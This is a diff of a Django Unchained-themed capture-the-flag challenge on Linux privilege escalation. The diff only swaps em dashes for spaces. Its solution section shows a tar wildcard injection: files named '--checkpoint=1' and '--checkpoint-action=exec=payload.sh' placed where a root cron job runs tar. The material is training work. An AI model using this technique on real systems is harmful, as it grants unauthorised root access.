@@ -1,4 +1,4 @@
-# Challenge 1 — Wildcard Injection
+# Challenge 1  Wildcard Injection
 
 **Difficulty:** Hard
 **Category:** Linux Privilege Escalation
@@ -8,7 +8,7 @@
 
 ## Story
 
-You are **Django**. You've made it onto Candyland plantation — but Broomhilda is locked
+You are **Django**. You've made it onto Candyland plantation  but Broomhilda is locked
 in Candie's vault, and only root can open it.
 
 Stephen, Candie's loyal head slave, runs a backup job every minute.
@@ -62,7 +62,7 @@ cat /etc/cron.d/candyland
 ```
 
 Notice the command: `tar czf /tmp/backup.tar.gz *`
-The `*` is the vulnerability — it expands to all filenames in the directory.
+The `*` is the vulnerability  it expands to all filenames in the directory.
 </details>
 
 <details>
@@ -99,9 +99,9 @@ Wait up to one minute for cron to fire.
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Confirm the cron job
+### Step 1  Confirm the cron job
 
 ```bash
 cat /etc/cron.d/candyland
@@ -111,7 +111,7 @@ cat /etc/cron.d/candyland
 * * * * * root cd /opt/candyland/backups && tar czf /tmp/backup.tar.gz *
 ```
 
-### Step 2 — Create the payload script
+### Step 2  Create the payload script
 
 ```bash
 cat > /opt/candyland/backups/payload.sh << 'EOF'
@@ -122,7 +122,7 @@ EOF
 chmod +x /opt/candyland/backups/payload.sh
 ```
 
-### Step 3 — Create the malicious filenames
+### Step 3  Create the malicious filenames
 
 ```bash
 touch /opt/candyland/backups/--checkpoint=1
@@ -134,7 +134,7 @@ When cron fires, the shell expands `*` into all filenames. Tar sees:
 tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=payload.sh payload.sh README.txt
 ```
 
-### Step 4 — Wait and read the flag
+### Step 4  Wait and read the flag
 
 ```bash
 watch -n 2 ls /tmp/broomhilda.txt
